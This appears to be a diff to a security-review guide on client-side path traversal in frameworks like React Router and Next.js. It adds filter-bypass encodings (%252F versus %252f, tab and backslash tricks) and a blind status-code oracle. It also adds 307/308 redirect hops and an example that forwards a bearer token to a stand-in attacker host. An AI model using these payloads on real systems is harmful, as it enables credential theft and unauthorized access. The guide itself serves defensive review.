@@ -81,6 +81,8 @@ The "sink" is any HTTP request builder. The "source" is the framework decoding s
 
 `useParams()` returns fully decoded values. `decodePath()` runs `decodeURIComponent` per-segment then re-encodes `/`, but `matchPath()` immediately undoes that with `value.replace(/%2F/g, "/")`. Net effect: `%2F` → `/`, `%2E%2E` → `..`, and even `%252F` round-trips to `/` via decode-then-replace.
 
+**Double-encoding is CASE-SENSITIVE (test both hex cases).** That `matchPath` replace uses `/%2F/g` with **no `i` flag**, so only the uppercase form is rewritten: `%252F` → (decode) `%2F` → (replace) `/` → traversal works, while `%252f` → (decode) `%2f` → **not replaced** → no traversal. This case gap was *reintroduced* by the "fix" for an earlier double-encoding bug. Practical rule for React Router (and Remix, which shares the router): always try **both** `%252F` and `%252f` (and `%2F`/`%2f`) — a payload that fails lowercase may succeed uppercase. A code-review tell is any single-case `.replace(/%2F/g, …)` / `.replace("%2F", …)` without the `i` flag in router/path-normalization code.
+
 ```javascript
 // VULN — path param interpolated into fetch
 const { userId } = useParams();
@@ -137,6 +139,8 @@ fetch(`/api/widgets/${widget}`);
 
 **SAFE**: page-level `await params` and `useParams()` (re-encoded).
 **DANGEROUS**: route handler `await params`, `useSearchParams()` on the client.
+
+**Blind detection via 500-error oracle**: server-side secondary-context PT is blind (no response body reaches the attacker), but the server-rendered route or route handler typically returns **HTTP 500 on an invalid resolved path and 200 when the path reconstructs to a valid one**. Probe a server-decoded path param with `%2F..%2F` payloads: a `500` for a climbing payload that lands nowhere vs. a `200` for a self-cancelling reconstruction (`value/../value`) confirms the param is decoded and concatenated into a server-side path/fetch. The same status-differential oracle applies to other SSR frameworks that bubble path errors (SvelteKit `+page.server.ts`/`+server.ts`, Nuxt `server/api`, Astro API routes).
 
 ### Vue Router / Nuxt (client)
 
@@ -426,7 +430,7 @@ Apps using HTMX (`hx-get="${url}"`) or Alpine.js (`x-data` / `:href="..."`) ofte
 
 | Framework | Source | %2F → /? | %2E%2E → ..? | %252F → /? | Splat/catch-all literal `../`? |
 |-----------|--------|:--------:|:------------:|:----------:|:-----------------------------:|
-| React Router | `useParams()` | YES | YES | YES (decode + replace) | YES (browser normalizes path → traversal stays in param value) |
+| React Router | `useParams()` | YES | YES | YES — **uppercase `%252F` only**; `%252f` is NOT (case-sensitive `replace`, no `i` flag) | YES (browser normalizes path → traversal stays in param value) |
 | Next.js page / `useParams` | re-encoded | NO | YES | NO | NO (re-encoded) |
 | Next.js route handler | decoded | YES | YES | NO | YES |
 | Vue Router | `route.params.*` | YES | YES | NO | depends on route shape |
@@ -620,11 +624,15 @@ The path the attacker controls is rarely the *whole* URL — usually it sits bet
 | **Single `..` past `encodeURIComponent`** | every segment is `encodeURIComponent`'d (so `/` is blocked) but you control ≥1 segment | `encodeURIComponent` leaves `.` untouched: set a segment to exactly `..` to climb one level per controlled segment; chain across multiple segments to reach a sibling path sharing the fixed suffix (`group=..&user=uploads&id=x.json` → `/users/../uploads/posts/x.json` → `/uploads/posts/x.json`) |
 | **Empty / `.` / `/`** | hitting a more general handler is enough (list-all vs. one record) | `id=`, `id=.`, `id=/` → `/users/`, `/users/.`, `/users//` — collapses to a less-specific route |
 | **Backslash = slash** | a custom filter blocks `/` but not `\` | the browser treats `\` as `/` in URLs and rewrites it before sending: `..\..\admin` → `/../../admin` |
-| **Tab/newline stripping** | a filter looks for the literal string `..` or a keyword | the URL parser strips `\t`/`\n`/`\r` first: `.%0A.` (`.\n.`) is parsed as `..`; `bloc%0Aked` defeats a `blocked` keyword filter |
+| **Tab/newline stripping** | a filter looks for the literal string `..` or a keyword | the URL parser (and `fetch()` itself) silently strips `\t`/`\n`/`\r` first: `.%0A.` (`.\n.`) **and** `.%09.` (`.\t.`, tab) both parse as `..`; `bloc%0Aked` defeats a `blocked` keyword filter. Combined WAF-bypass shape: `%2F%2e%09%2e%5C` → `fetch` drops the `%09` and treats `%5C` as `/`, resolving to `/../` while a `..`/`%2e%2e` pattern-matcher sees nothing |
 | **Case / double encoding** | a server or reverse proxy decodes before resolving | test both `%2f`/`%2F`; if the app explicitly `decodeURIComponent`s its input, `%252e%252e%252f` round-trips to `../`; mixed obfuscation `%2e%0a%09%2e\other` → `../other` |
 | **Leading `//` → cross-origin** | the controlled value is the FIRST path segment, e.g. `fetch(\`/${lang}/info\`)` | a value starting with `//host` is parsed as a protocol-relative absolute URL: `lang=/attacker.com` → `//attacker.com/info` — the fetch (and any `headers`/`body` it carries) goes cross-origin (see Authorization-header leak below) |
 
 ### Authorization-header leak via cross-origin redirect
+
+### Cross-origin host hop via 307/308 (method + body preserved)
+
+A CSPT normally only controls the path on the *current* origin. To reach a more sensitive sibling origin (e.g. `api.example.com` from `app.example.com`), chain a gadget that issues a **307/308** redirect: unlike 301/302/303, these **preserve the HTTP method, body, and most headers**, so a CSPT-controlled `POST` keeps its body when it lands on the new host. Useful gadgets: an on-site open redirect that returns 307/308, or image-transform/proxy endpoints that emit a 307 to a chosen subdomain+path (`/cdn-cgi/image/.../https://api.example.com/<path>`). Caveats that decide exploitability: the destination must allow the request via **CORS**; cookies follow their **SameSite** policy; and browsers **do not forward `Authorization` across a cross-origin redirect** — so this hop is most useful against **cookie- or custom-header-authenticated** APIs. Flag any CSPT that can reach a 307/308-emitting gadget on the same origin as a **cross-origin escalation** primitive, not a same-origin-only finding.
 
 When the vulnerable `fetch` sets sensitive `headers` (e.g. `Authorization: Bearer …`) or a body, a leading-`//` or open-redirect gadget that sends the request **cross-origin** can exfiltrate them. The browser's rule: a request that is **same-origin at first** has its `Authorization` header dropped on a cross-origin redirect, but a request that is **cross-origin from the start keeps it across further redirects** — and `www.`/`api.` subdomain differences count as cross-origin. So traversing a `fetch` on `example.com` to `https://api.example.com/redirect?url=https://attacker.tld` forwards the bearer token to the attacker. Flag any CSPT-controllable `fetch` that attaches `Authorization`/cookies/CSRF headers and can be steered cross-origin as a **credential-exfiltration** primitive, not just a redirected read.
 
@@ -819,7 +827,7 @@ Flag CRITICAL when ANY of the following are present in the same component/page w
 
 1. Identify the decoded source (`useParams`, `route.params`, `paramMap.get`, `params.*` in load, etc.) and confirm it bypasses the framework's safe sources (e.g., not `route.path`, `router.url`, `useLocation().pathname`).
 2. Trace the value to a `fetch`-style sink and confirm there is NO `encodeURIComponent`, allowlist regex, or param matcher (`[id=id]` in SvelteKit) between source and sink.
-3. Construct an encoding payload that survives both the browser and the framework decoder (see "Decoding Cheat Sheet"). Use literal `../` for query params and splat/catch-all routes; use `%2F`-style encoding for single-segment dynamic params; use `%252F` only for React Router and Next.js page query.
+3. Construct an encoding payload that survives both the browser and the framework decoder (see "Decoding Cheat Sheet"). Use literal `../` for query params and splat/catch-all routes; use `%2F`-style encoding for single-segment dynamic params; use `%252F` only for React Router and Next.js page query — and for React Router try **both** `%252F` and `%252f`, since its double-decode replace is case-sensitive (uppercase-only).
 4. Verify the fetch URL after browser normalization. The browser resolves `../` in the path portion of the request just before sending; the resolved path is what the server sees.
 5. For secondary-context PT, repeat with the server sink as the request target and confirm reachability of internal hosts/paths.
 6. For XSS chaining, demonstrate that the redirected fetch endpoint returns attacker-controlled HTML (file upload, attachments, user-generated content) and that the response flows into the framework's HTML sink.
